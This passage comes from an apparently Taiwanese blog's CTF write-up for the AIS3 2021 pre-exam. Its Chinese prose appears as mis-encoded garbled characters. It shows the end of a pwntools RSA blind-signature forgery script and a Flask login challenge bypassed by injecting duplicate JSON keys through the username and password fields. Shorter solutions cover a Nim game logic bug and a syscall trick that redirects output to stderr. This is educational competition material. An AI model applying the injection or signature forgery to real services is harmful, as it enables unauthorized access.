p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Signature: &#39;</span>)
S <span style=color:#f92672>=</span> int(p<span style=color:#f92672>.</span>recvline())          <span style=color:#75715e># S === M^d mod n</span>

s <span style=color:#f92672>=</span> (S <span style=color:#f92672>*</span> inverse(r, n)) <span style=color:#f92672>%</span> n    <span style=color:#75715e># s is the fake signature we want</span>
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;3) exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)

p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;2&#39;</span>)                <span style=color:#75715e># verify with s</span>
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Signature: &#39;</span>)
p<span style=color:#f92672>.</span>sendline(str(s))
p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p><code>AIS3{R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9}</code></p><hr><h1 id=web>WEB<a hidden class=anchor aria-hidden=true href=#web>#</a></h1><h2 id=yet-another-login-page>Yet Another Login Page<a hidden class=anchor aria-hidden=true href=#yet-another-login-page>#</a></h2><p>é¡Œç›®æœ‰çµ¦Sourceï¼Œæ˜¯å¾Œç«¯ç”¨Flaskå¯«çš„ç™»å…¥é é¢ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, make_response, redirect, session, render_template, send_file
<span style=color:#f92672>import</span> os
<span style=color:#f92672>import</span> json

app <span style=color:#f92672>=</span> Flask(__name__)
app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>32</span>)

FLAG <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;FLAG&#39;</span>, <span style=color:#e6db74>&#39;AIS3{TEST_FLAG}&#39;</span>)
users_db <span style=color:#f92672>=</span> {
    <span style=color:#e6db74>&#39;guest&#39;</span>: <span style=color:#e6db74>&#39;guest&#39;</span>,
    <span style=color:#e6db74>&#39;admin&#39;</span>: os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;S3CR3T_P455W0RD&#39;</span>)
}

<span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>valid_user</span>(user):
        <span style=color:#66d9ef>return</span> users_db<span style=color:#f92672>.</span>get(user[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>==</span> user[<span style=color:#e6db74>&#39;password&#39;</span>]

    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;user_data&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> session:
        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;login.html&#34;</span>, message<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Login Please :D&#34;</span>)

    user <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(session[<span style=color:#e6db74>&#39;user_data&#39;</span>])
    <span style=color:#66d9ef>if</span> valid_user(user):
        <span style=color:#66d9ef>if</span> user[<span style=color:#e6db74>&#39;showflag&#39;</span>] <span style=color:#f92672>==</span> True <span style=color:#f92672>and</span> user[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;guest&#39;</span>:
            <span style=color:#66d9ef>return</span> FLAG
        <span style=color:#66d9ef>else</span>:
            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;welcome.html&#34;</span>, username<span style=color:#f92672>=</span>user[<span style=color:#e6db74>&#39;username&#39;</span>])

    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;login.html&#34;</span>, message<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Verify Failed :(&#34;</span>)


<span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/login&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
    data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;showflag&#34;: false, &#34;username&#34;: &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;, &#34;password&#34;: &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;}&#39;</span> <span style=color:#f92672>%</span> (
        request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;username&#34;</span>], request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
    )
    session[<span style=color:#e6db74>&#39;user_data&#39;</span>] <span style=color:#f92672>=</span> data
    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/&#34;</span>)
</code></pre></div><p>åœ¨login()å¯ä»¥çœ‹åˆ°POST Requestè£¡é¢çš„usernameå’Œpasswordç›´æ¥è¢«å¡é€²ä¸€å€‹JSONç‰©ä»¶ï¼Œç„¶å¾Œåœ¨index()è£¡é¢é€²è¡Œé©—è­‰ï¼Œæˆ‘å€‘éœ€è¦é€šé<code>valid_user(user)</code>ä»¥åŠ<code>user['showflag'] == True and user['username'] != 'guest'</code> é€™å…©å€‹testã€‚</p><p>æ¥ä¸‹ä¾†å°±æ˜¯å˜—è©¦å„ç¨® username å’Œ password çµ„åˆ</p><p>ä¸»è¦æƒ³æ³•æ˜¯åœ¨dataè£¡é¢æ³¨å…¥é‡è¤‡çš„keyä¾†è¦†å¯«åŸæœ¬çš„value</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> json
<span style=color:#f92672>import</span> os

users_db <span style=color:#f92672>=</span> {
    <span style=color:#e6db74>&#39;guest&#39;</span> : <span style=color:#e6db74>&#39;guest&#39;</span>,
    <span style=color:#e6db74>&#39;admin&#39;</span>: os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;S3CR3T_P455W0RD&#39;</span>)
}

username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x2w&#34;, &#34;showflag&#34;: true, &#34;foo&#34;:&#34;&#39;</span>
password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#34;, &#34;password&#34;: null, &#34;foo&#34;:&#34;&#39;</span>

data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;showflag&#34;: false, &#34;username&#34;: &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;, &#34;password&#34;: &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;}&#39;</span> <span style=color:#f92672>%</span> (
    username, password
)
user <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(data)

<span style=color:#66d9ef>if</span> users_db<span style=color:#f92672>.</span>get(user[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>==</span> user[<span style=color:#e6db74>&#39;password&#39;</span>]:
    <span style=color:#66d9ef>if</span> user[<span style=color:#e6db74>&#39;showflag&#39;</span>] <span style=color:#f92672>==</span> True <span style=color:#f92672>and</span> user[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;guest&#39;</span>:
        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;SUCCESS&#34;</span>) <span style=color:#75715e># bypass checks</span>
</code></pre></div><p>é€™æ¨£å­çš„userç‰©ä»¶æœƒæ˜¯</p><p><code>{'showflag': True, 'username': 'x2w', 'foo': '', 'password': None}</code></p><p>åœ¨ç¬¬ä¸€å€‹testçš„çµæœæ˜¯<code>None == None</code>ï¼Œé€™åœ¨Pythonè£¡é¢æ˜¯True</p><p>ç¬¬äºŒå€‹testä¹Ÿæœƒé€šéï¼Œshowflag å’Œ username éƒ½è¢«è¦†å¯«éäº†</p><p>æ‹¿åˆ°Flag <code>AIS3{/r/badUIbattles?!?!}</code></p><hr><h1 id=misc>MISC<a hidden class=anchor aria-hidden=true href=#misc>#</a></h1><h2 id=microcheese>Microcheese<a hidden class=anchor aria-hidden=true href=#microcheese>#</a></h2><p>é€™é¡ŒåŸæœ¬æ˜¯Cryptoçš„æŸé¡Œï¼Œå› ç‚ºé‚è¼¯å¯«çˆ›äº†æœ‰è«åå…¶å¦™çš„è§£æ³•è€Œè¢«æ­¸é¡åˆ°Miscä¾†ã€‚</p><p>é€£åˆ°serverè®“ä½ å’Œé›»è…¦ç©<a href=https://en.wikipedia.org/wiki/Nim>Nim Game</a>ï¼Œ</p><p>å¯ä»¥é™¤å­˜éŠæˆ²ä¸¦ä¸”å†è¼‰å…¥ã€‚(ä»¥Hashçš„å½¢å¼)</p><p>è´äº†å°±çµ¦Flagï¼Œç•¶ç„¶ç”Ÿæˆçš„æ¯ä¸€å±€éƒ½æ˜¯é›»è…¦å¿…è´ã€‚</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/microcheese01.png></figure><p>åŸæœ¬åœ¨éŠæˆ²è£¡æ‡‰è©²åªæœ‰ä¸‰ç¨®æ“ä½œï¼š</p><ol start=0><li>make a move</li><li>save the current game and leave</li><li>resign the game</li></ol><p>ä½†æ˜¯å› ç‚ºæœ€å¾Œä¸€å€‹åˆ¤æ–·åœåœ¨<code>elif</code>è€Œä¸æ˜¯<code>else</code>ï¼Œæˆ‘å€‘å¯ä»¥è¼¸å…¥3, 4, 5&mldr;ä¹‹é¡çš„</p><p>å¯ä»¥ç¹¼çºŒä¸‹æ£‹é‚„ä¸æœƒcrash</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/microcheese02.png></figure><p>æåˆ°æœ€å¾Œè®Šæˆæ˜¯ä¸€å±€æˆ‘å€‘å¯ä»¥è´çš„Nim Game&mldr;</p><p><code>AIS3{5._e3_b5_6._a4_Bb4_7._Bd2_a5_8._axb5_Bxc3}</code></p><p>åŸæœ¬çš„é¡Œç›®å¥½åƒæ˜¯è¦æ‰¾Hashçš„æ¼æ´ç„¶å¾Œè®“å®ƒè¼‰å…¥ä¸€å±€æˆ‘å€‘å¿…è´çš„Nim Game?</p><p>å¯æƒœæˆ‘å¤ªèœä¸æ‡‚Hash</p><hr><h2 id=blind>Blind<a hidden class=anchor aria-hidden=true href=#blind>#</a></h2><p>é¡Œç›®Source:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/syscall.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> syscall_black_list[] <span style=color:#f92672>=</span> {};

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>make_a_syscall</span>()
{
    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> rax, rdi, rsi, rdx;
    scanf(<span style=color:#e6db74>&#34;%llu %llu %llu %llu&#34;</span>, <span style=color:#f92672>&amp;</span>rax, <span style=color:#f92672>&amp;</span>rdi, <span style=color:#f92672>&amp;</span>rsi, <span style=color:#f92672>&amp;</span>rdx);
    syscall(rax, rdi, rsi, rdx);
}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
{
    setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
    setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
    puts(<span style=color:#e6db74>&#34;You can call a system call, then I will open the flag for you.&#34;</span>);
    puts(<span style=color:#e6db74>&#34;Input: [rax] [rdi] [rsi] [rdx]&#34;</span>);
    close(<span style=color:#ae81ff>1</span>);
    make_a_syscall();
    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;flag&#34;</span>, O_RDONLY);
    <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x100</span>];
    size_t flag_len <span style=color:#f92672>=</span> read(fd, flag, <span style=color:#ae81ff>0xff</span>);
    write(<span style=color:#ae81ff>1</span>, flag, flag_len);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p><code>close(1)</code>ä¹‹å¾Œå†æŠŠFlag å°åˆ° stdoutï¼Œç•¶ç„¶çœ‹ä¸åˆ°ã€‚</p><p>ä¸Šç¶²çˆ¬äº†ä¸€å †æ–‡ä¹‹å¾Œæ‰¾åˆ°<a href=https://stackoverflow.com/questions/9084099/re-opening-stdout-and-stdin-file-descriptors-after-closing-them/9084222>é€™ç¯‡</a></p><p>ç™¼ç¾File Descriptorå±…ç„¶å¯ä»¥é€éç‰¹å®šçš„syscallè¤‡è£½ä¸€ä»½?</p><p>ç”¨<code>syscall(33, 2, 1, 0)</code>è®“Flagå¾stderrè·‘å‡ºä¾†ï¼š</p><p><code>AIS3{dupppppqqqqqub}</code></p><p>åˆå­¸åˆ°äº†ä¸€å€‹é€™è¼©å­å¤§æ¦‚ä¸æœƒå†ç”¨åˆ°çš„syscall</p><hr><h2 id=cat-slayer-fake>Cat Slayer <em>Fake</em><a hidden class=anchor aria-hidden=true href=#cat-slayer-fake>#</a></h2><p>å°±æ˜¯ä¸€å€‹å¯†ç¢¼é–ï¼Œå¥½åƒæœ‰13ä½ä¾†è‘—ï¼Ÿæ¯ä¸€ä½éƒ½æ˜¯0-9</p><p>å› ç‚ºæ¯æ¬¡è¼¸å…¥éƒ½èƒ½çŸ¥é“è‡ªå·±çš„å¯†ç¢¼åˆ°ç›®å‰ç‚ºæ­¢æ­£ç¢ºé‚„éŒ¯èª¤</p><p>æ‰€ä»¥é€™å€‹é–æ˜¯ <code>O(10*n)</code> è€Œä¸æ˜¯ <code>O(10^n)</code></p><p>ç„¶å¾Œå› ç‚ºé€™å€‹é–çš„ç•Œé¢æ˜¯ç”¨ncursesä¹‹é¡çš„æ±æ±å¯«çš„è€Œä¸æ˜¯å‚³çµ±çš„CLI</p><p>æˆ‘é‚„çœŸçš„ä¸æœƒå¯«pwntoolsè‡ªå‹•åŒ–XD</p><p>æˆ‘è¨˜å¾—å¥½åƒæ˜¯åœ¨è§£Reverseè§£åˆ°ç²¾ç¥æ¸™æ•£çš„æ™‚å€™ä¾†æŒ‰ä¸€æŒ‰ï¼Œç•¶ä½œè…¦éƒ¨å¾©å¥ã€‚</p><p>å¿˜è¨˜å»ç´€éŒ„Flagæ˜¯ä»€éº¼äº†ï¼Œç„¶å¾Œé€™é¡Œæœ€å¾Œå¥½åƒå¾Miscæ¬åˆ°Welcomeé€™å€‹å¥‡å¦™çš„é¡åˆ¥å»äº†</p><p>æ¬¸ä»¥å¾ŒWelcomeå¤šå‡ºå¹¾é¡Œé˜¿ï¼Œæˆ‘æœƒåŠªåŠ›å»è§£çš„ã€‚</p><hr><h1 id=çµæœèˆ‡å¿ƒå¾—>çµæœèˆ‡å¿ƒå¾—<a hidden class=anchor aria-hidden=true href=#çµæœèˆ‡å¿ƒå¾—>#</a></h1><p>å†æ¬¡é«”æœƒåˆ°è‡ªå·±å¾ˆèœ</p><p>ç„¶å¾Œç¬¬ä¸€æ¬¡å¯«writeupå°±å·²ç¶“ç´¯åˆ°ä¸æƒ³å†å¯«ç¬¬äºŒæ¬¡äº†ã€‚</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/pre_exam_score.png></figure><ol start=0><li><p>REVERSE å°±æ˜¯åœ°ç„ï¼Œæ¯æ¬¡çœ‹åˆ°æ–°çš„é¡Œå½¢éƒ½æœƒå¾ˆæƒ³æ­»ï¼Œä¸éåšéä¸€æ¬¡å¾Œé€šå¸¸å°±æœƒè¦ºçš„é¡ä¼¼çš„é¡Œå½¢å¾ˆç°¡å–®äº†ï¼Œç›¸ç•¶åƒç¶“é©—çš„é ˜åŸŸã€‚</p></li><li><p>PWN è©²å­¸UAFå’ŒHeap Exploitsäº†ï¼Œä¸ç„¶æ¯æ¬¡éƒ½åªèƒ½è§£æ°´é¡Œï¼Œè©±èªªä»Šå¹´æ€éº¼å¥½åƒæ²’çœ‹åˆ°Format String?ç„¶å¾ŒNoperå±…ç„¶é‚„æ˜¯é€™æ¬¡è§£çš„é¡Œç›®è£¡åˆ†æ•¸æœ€é«˜çš„&mldr;æ¯”æ®ºäº†æˆ‘å¥½å¤šè…¦ç´°èƒçš„Colorsåˆ†æ•¸é‚„é«˜åˆ°åº•æ˜¯æ€éº¼å›äº‹ï¼ŸPWNçœŸé¦™ã€‚</p></li><li><p>CRYPTO æˆ‘çœŸçš„æœ‰å¤ èœï¼Œè§£ä¸å‡ºä¾†åªèƒ½åœ¨è·¯é‚ŠCRY</p></li><li><p>WEB åˆ°åº•å“ªè£¡å¥½å…¥é–€äº†ï¼Œåˆ°åº•æ˜¯èª°èªªå¾ˆå¥½å…¥é–€çš„ï¼Ÿ</p></li></ol><p>æœ€å¾Œä¸€å¤©ä¸€é¡Œéƒ½æ²’è§£å‡ºä¾†ï¼Œç•¶å¤©é‚„ç ¸äº†å…­å€‹å°æ™‚åœ¨æŸé¡ŒReverseä¸Šã€‚æ˜æ˜å°±åªå·®æœ€å¾Œä¸€å°æ­¥äº†&mldr;ä¸éæ²’è§£å‡ºä¾†å°±æ˜¯æ²’è§£å‡ºä¾†ï¼Œåªèƒ½çœ¼çœçœçœ‹è‘—è‡ªå·±å¾å‰äºŒååæ‰åˆ°ç¬¬å››å&mldr;</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://x2w-sloth.github.io/zh/tags/ctf/>CTF</a></li><li><a href=https://x2w-sloth.github.io/zh/tags/ais3/>AIS3</a></li></ul><nav class=paginav><a class=next href=https://x2w-sloth.github.io/zh/posts/hello_world/><span class=title>ä¸‹ä¸€é¡µ Â»</span><br><span>åæ­£å°±é–‹å§‹å¯«Blogäº†</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://x2w-sloth.github.io/zh/>Sloth-Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>